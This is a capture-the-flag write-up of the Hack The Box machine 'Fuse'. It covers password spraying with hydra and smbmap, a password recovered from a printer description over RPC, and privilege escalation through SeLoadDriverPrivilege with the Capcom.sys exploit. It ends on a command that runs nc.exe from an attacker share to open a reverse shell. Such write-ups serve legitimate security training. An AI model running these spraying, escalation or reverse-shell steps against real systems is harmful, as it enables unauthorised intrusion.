[Fuse](https://www.hackthebox.eu/home/machines/profile/256) is a medium windows box by [egre55](https://www.hackthebox.eu/home/users/profile/1190).

### Overview

The box starts with web-enumeration, where can find a couple of usernames. Using CeWL, we generate a wordlist out of words from the webpage and start a password-spraying-attack. This gives us valid credentials, however our account is setup in such way, that we have to change our password before logging in. We use smbpasswd to change our password. By checking out the smb-shares, we can see that a printer is installed, however no interesting files can be found. Continuing our enumeration with RPC, we find a password by enumerating the printers. Starting another password-spraying-attack with the found password, we get a working set of credentials, which we can use to get a shell using evil-winrm. With this shell we can now read user.txt.

In order to get root, we exploit the SeLoadDriverPrivilege of the user. For this we need to upload the vulnerable driver and the exploit to the machine and execute the exploit. This gives us arbitrary-code execution in the context of system. Using this we get a reverse-shell as `nt authority\system` and can read root.txt.

# Information Gathering

## Nmap

We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.193

# Enumeration
There are a lot of open ports, however **80** (http) is always interesting, so let us start here.

## HTTP - Port 80

Let us start our web-enumeration by going to http://10.10.10.193.

![Webpage](/assets/htb/Fuse/web/redirect-webpage.png)

Upon visiting the url, we get redirected to . Let us add this domain to our /etc/hosts file.

```bash
root@darkness:~# cat /etc/hosts
[...]
10.10.10.193    fabricorp.local fuse.fabricorp.local
```

Now let us access the webpage again.

![Index webpage](/assets/htb/Fuse/web/index-webpage.png)

Now accessing the url, we get access to the web-interface of PaperCut.

Let check out all the logs for the three dates that are available.

![Print log 1](/assets/htb/Fuse/web/logs-webpage-1.png)

We get three usernames: `pmerton`, `tlavel` and `bnielson`.

![Print log 2](/assets/htb/Fuse/web/logs-webpage-2.png)

We get another username `sthompson` and a interesting document: `Fabricorp01.docx`.

![Print log 3](/assets/htb/Fuse/web/logs-webpage-3.png)

We get another two usernames `bhult` and `administrator`.

Let us add all these usernames to a wordlist that we can use later on.

```bash
root@darkness:~# cat users.txt 
thompson
pmerton
tlavel
bnielson
bhult
administrator
```

After looking around on the web-interface a bit more, I have decided to use CeWL again to try and generate a wordlist for password-spraying.

### Using CeWL to generate wordlists

We can use a tool called [CeWL](https://github.com/digininja/CeWL) to grep all words from the website and use it as possible password-candidates.

```bash
root@darkness:~# cewl http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers --depth 3 -m 5 -w wl.txt
root@darkness:~# wc -l wl.txt 
104 wl.txt
```

We define that all words with at least 5 characters (numbers possible) are added to the wordlist resulting into 104 possible password candidates.

### Password spraying

We can now start our password-spraying attack with all the found usernames and possible password-candidates.

```bash
root@darkness:~# hydra -L users.txt -P wl.txt smb://10.10.10.193
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-07 12:52:33
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 624 login tries (l:6/p:104), ~624 tries per task
[DATA] attacking smb://10.10.10.193:445/
[445][smb] host: 10.10.10.193   login: tlavel   password: Fabricorp01
[445][smb] host: 10.10.10.193   login: bnielson   password: Fabricorp01
[445][smb] host: 10.10.10.193   login: bhult   password: Fabricorp01
1 of 1 target successfully completed, 3 valid passwords found
```

We get the password `Fabricorp01` working for three users: `tlavel`, `bnielson` and `bhult`. Let us see if we find any interesting smb-shares.

## SMB - Port 445

Let us try to list all shares for each user with smbmap:

```bash
root@darkness:~# for user in tlavel bnielson bhult; do smbmap -u $user -p Fabricorp01 -H 10.10.10.193; done
[!] Authentication error on 10.10.10.193
[!] Authentication error on 10.10.10.193
[!] Authentication error on 10.10.10.193
```

We do get an authentication error for all of the 3 users... Let us try smbclient.

```bash
root@darkness:~# smbclient -U tlavel -L //10.10.10.193/
Enter WORKGROUP\tlavel password: Fabricorp01
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
root@darkness:~# smbclient -U bnielson -L //10.10.10.193/
Enter WORKGROUP\bnielson password: 
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
root@darkness:~# smbclient -U bhult -L //10.10.10.193/
Enter WORKGROUP\bhult password: 
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```

Seems like we have valid credentials, but we have to change our current password to be able to login. Luckily, Kali has a tool for that `smbpasswd`.

### Changing passwords with smbpasswd

We can now change the password of one of these users via `smbpasswd`.

```bash
root@darkness:~# smbpasswd -U tlavel -r 10.10.10.193
Old SMB password: Fabricorp01
New SMB password: Chr0nOs$!_
Retype new SMB password: Chr0nOs$!_
Password changed for user tlavel on 10.10.10.193
```

Now that we have changed the password for `tlavel`, we should be able to list the smb-shares.

```bash
root@darkness:~# smbclient -U tlavel -L //10.10.10.193/
Enter WORKGROUP\tlavel password: Chr0nOs$!_

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        HP-MFT01        Printer   HP-MFT01
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

We are indeed able to list all shares. There seems to be a printer installed, however checking out the shares no interesting files can be found.

```python
#!/usr/bin/env python3
import subprocess
from random import randint

password = b"Fabricorp01"

# Use smbpasswd to change the password of the user
def change_pw(username, old_pw, password):
    proc = subprocess.Popen([b"smbpasswd", b"-U", username, b"-r", b"10.10.10.193"], stdin=subprocess.PIPE)
    proc.communicate(input=old_pw + b"\n" + password + b'\n' + password + b'\n')

users = [b"tlavel",b"bhult",b"bnielson"]
old_pw = password
password = b"Chr0nOs!_" + bytes([randint(33,126)]) # Valid ascii range 33-126

print(f"[+] Changing to: {password.decode()}")
for user in users:
	change_pw(user,old_pw,password)
```

A quickly created a python script based on this [stackoverflow thread](https://stackoverflow.com/questions/19813376/change-an-user-password-on-samba-with-python) to change the password of each of the three user, because it seems like the password is required to change about every minute.

```bash
root@darkness:~# python3 changePw.py 
[+] Changed to: Chr0nOs_|
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user tlavel on 10.10.10.193.
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user bhult on 10.10.10.193.
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user bnielson on 10.10.10.193.
Redo?
```

After some enumeration it seems like smb does not hold any interesting information for us.

## RPC - Port 139

Let us enumerate RPC next.

```bash
root@darkness:~# rpcclient -U tlavel -r 10.10.10.193
Enter WORKGROUP\tlavel password: Chr0nOs_|
rpcclient $>
```

Let us start by getting a list of all users.

```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]
```

As we have seen previously that a printer is installed let us use `enumprinters` to check for any printer-config.

```bash
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]
```

Seems like we have a password: `$fab@s3Rv1ce$1`. Now let us do a password-spraying attack once again.

```bash
root@darkness:~# cat full-users.txt 
Administrator
Guest
krbtgt
DefaultAccount
svc-print
bnielson
sthompson
tlavel
pmerton
svc-scan
bhult
dandrews
mberbatov
astein
dmuir
```

We can now start the password-spraying attack using smbmap with a bash-loop or other tools like hydra or crackmapexec.

```bash
root@darkness:~# for user in $(cat full-users.txt); do echo "[*] Trying $user"...; smbmap -u $user -p '$fab@s3Rv1ce$1' -H 10.10.10.193; done | grep -v "error"
[*] Trying Administrator...
[*] Trying Guest...
[*] Trying krbtgt...
[*] Trying DefaultAccount...
[*] Trying svc-print...
[+] IP: 10.10.10.193:445        Name: fabricorp.local
	[...]
[*] Trying bnielson...
[*] Trying sthompson...
[*] Trying tlavel...
[*] Trying pmerton...
[*] Trying svc-scan...
[+] IP: 10.10.10.193:445        Name: fabricorp.local
	[...]
[*] Trying bhult...
[*] Trying dandrews...
[*] Trying mberbatov...
[*] Trying astein...
[*] Trying dmuir...
```

The password seems to work for both `svc-print` and `svc-scan`. We can try to get a shell by using evil-winrm now.

## Getting user-shell

Let us try both users and see if we get a shell

```powershell
root@darkness:~# evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i 10.10.10.193

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-print\Documents>
```

We get a shell using the `svc-print` account and can now read user.txt.

```powershell
*Evil-WinRM* PS C:\Users\svc-print\Desktop> type user.txt
7edf6***************************
```

## Privesc

Now that we have a shell as user, let us enumerate the system and find a privesc vector to root.

### Enumeration as svc-print

Let us check out our privileges first.

```powershell
*Evil-WinRM* PS C:\Users\svc-print\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Googling for `SeLoadDriverPrivilege exploit`, we find [this article](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/), which explains how we can exploit this privilege using the Capcom.sys driver. I am going to use [this exploit](https://github.com/clubby789/ExploitCapcom/releases/tag/1.0), simply because it is already precompile so I do not have to compile it myself and [this Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) file.

### Exploiting SeLoadDriverPrivilege

In order to exploit this vulnerability, we first have to upload the Capcom.sys driver and the exploit. Luckily evil-winrm does all the heavy lifting for us.

```powershell
Evil-WinRM* PS C:\Users\svc-print\Documents> upload Capcom.sys
Info: Uploading Capcom.sys to C:\Users\svc-print\Documents\Capcom.sys

                                                              
Data: 14100 bytes of 14100 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-print\Documents> upload ExploitCapcom.exe
Info: Uploading ExploitCapcom.exe to C:\Users\svc-print\Documents\ExploitCapcom.exe

                                                              
Data: 387752 bytes of 387752 bytes copied

Info: Upload successful!
```

Now that the files are uploaded we can run the exploit to learn how to use it.

```powershell
*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom.exe
USAGE: 00000272A5966B70<LOAD/EXPLOIT> '<PATH/COMMAND>'
LOAD will load the vulnerable driver at PATH, EXPLOIT will run COMMAND
```

In order to exploit, we first have to load the driver and then define the command to be run.

```powershell
*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom.exe LOAD C:\Users\svc-print\Documents\Capcom.sys
[*] Service Name: mptiyzkr`ùV
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\????????????????????
NTSTATUS: 00000000, WinError: 0
*Evil-WinRM* PS C:\Users\svc-print\Documents>
```

We have successfully loaded the driver. Now we should be able to run arbitrary commands as system. For this we simply have to supply `EXPLOIT "COMMAND"` to the exploit-program. I am going to host nc.exe via smb using my [SMBServ script](https://github.com/chr0x6eos/SMBServ).

```bash
root@darkness:~# smbserv -f /usr/share/windows-binaries/nc.exe 

#####################

```

Now that the smb-server is running, we can exploit the vulnerability and should get a reverse-shell as system.

```powershell
*Evil-WinRM* PS C:\Users\svc-print\Documents> .\ExploitCapcom.exe EXPLOIT "\\10.10.14.3\share\nc.exe 10.10.14.3 443 -e powershell.exe"
